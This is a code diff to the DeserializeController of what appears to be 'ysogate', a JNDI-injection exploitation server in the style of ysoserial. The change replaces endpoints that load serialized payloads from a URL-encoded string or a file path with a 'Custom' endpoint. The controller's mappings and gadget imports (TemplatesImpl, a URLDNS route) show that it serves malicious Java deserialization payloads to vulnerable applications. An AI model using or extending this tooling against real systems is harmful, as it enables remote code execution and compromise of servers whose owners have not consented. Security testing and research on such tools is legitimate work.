@@ -1,17 +1,12 @@
 package com.h2tg.ysogate.controller;
 
 import com.h2tg.ysogate.payloads.ObjectPayload.Utils;
-import com.h2tg.ysogate.utils.Gadgets;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.h2tg.ysogate.annotation.JNDIController;
 import com.h2tg.ysogate.annotation.JNDIMapping;
 import com.h2tg.ysogate.payloads.gadgets.*;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.util.Base64;
-import com.h2tg.ysogate.Serializer;
-
+import java.io.IOException;
 import static com.h2tg.ysogate.Serializer.serialize;
+import static com.h2tg.ysogate.utils.MiscUtils.parseCustomData;
 
 @JNDIController
 @JNDIMapping("/Deserialize")
@@ -21,16 +16,19 @@ public class DeserializeController implements Controller {
         return obj;
     }
 
-    @JNDIMapping("/FromUrl/{data}")
-    public byte[] fromUrl(String data) {
-        System.out.println("[Deserialize] Load custom serialized data from url");
-        return Base64.getUrlDecoder().decode(data);
-    }
+    @JNDIMapping("/Custom/{data}")
+    public byte[] custom(String data) throws IOException
+    {
+        System.out.println("[Deserialize] Load custom serialized data");
+        byte[] byteCode;
+        try {
+            byteCode = parseCustomData(data);
+        } catch (Exception e) {
+            System.out.println("[Error] Failed to parse custom data");
+            return null;
+        }
 
-    @JNDIMapping("/FromFile/{path}")
-    public byte[] fromFile(String path) throws Exception {
-        System.out.println("[Deserialize] Load custom serialized data from file: " + path);
-        return Files.readAllBytes(Paths.get(path));
+        return byteCode;
     }
 
     @JNDIMapping("/URLDNS/{url}")
